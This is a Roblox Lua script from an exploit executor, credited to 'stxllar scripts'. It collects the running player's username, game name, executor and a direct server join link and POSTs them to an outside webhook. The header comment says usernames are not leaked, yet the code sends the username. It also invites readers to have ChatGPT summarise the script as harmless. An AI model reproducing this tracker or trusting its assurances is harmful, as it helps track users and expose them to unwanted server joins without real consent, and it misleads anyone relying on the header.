-- THIS FILE IS TITLED READ_ME BECAUSE I AM NOT AFRAID OF SHARING IT.
-- what is this? this is just a script that sends your join links to me every time you execute TALENTLESS. this is so i can join you guys when im bored n stuff. YOUR USERNAMES ARE NOT LEAKED AND THESE LOGS ARE ONLY GOING TO ME.
-- also there is no harmful information being logged here, you can ask chatgpt to summarize the script. all it does is give me access to join you guys' servers.

-- Ensure services are loaded
repeat wait() until game:IsLoaded()

local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local player = Players.LocalPlayer

-- Get the place info (defaults to asset info)
local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId) -- no Enum needed
local gameName = placeInfo.Name

-- Username & quick join
local username = player.Name
local jobId = game.JobId
local joinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId

-- Function to send webhook
local function sendWebhookMessage(gameName, username, joinLink)
    local data = {
        content = "",
        embeds = {{
            title = "(＃＞＜) *someone executed our script!*",
            color = 16711935, -- Bright pink
            fields = {
                { name = "**(・ω・) username**", value = username, inline = true },
                { name = "**(≧◡≦) game**", value = gameName, inline = true },
                { name = "**(=^･ω･^=) executor**", value = identifyexecutor(), inline = true },
                { name = "**✧ quick join ✧**", value = "[Join this server~](" .. joinLink .. ")", inline = false }
            },
            footer = { text = "stxllar scripts" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local jsonData = game:GetService("HttpService"):JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }
    local request = http_request or request or HttpPost or syn.request

    request({
        Url = "https://webhook-api-six.vercel.app/api/webhook",
        Method = "POST",
        Headers = headers,
        Body = jsonData
    })
end

-- Send webhook after a short delay
delay(1, function()
    sendWebhookMessage(gameName, username, joinLink)
    print("(ﾉ◕ヮ◕)ﾉ STXLLAR webhook sent! ヽ(◕ヮ◕ヽ)")
end)
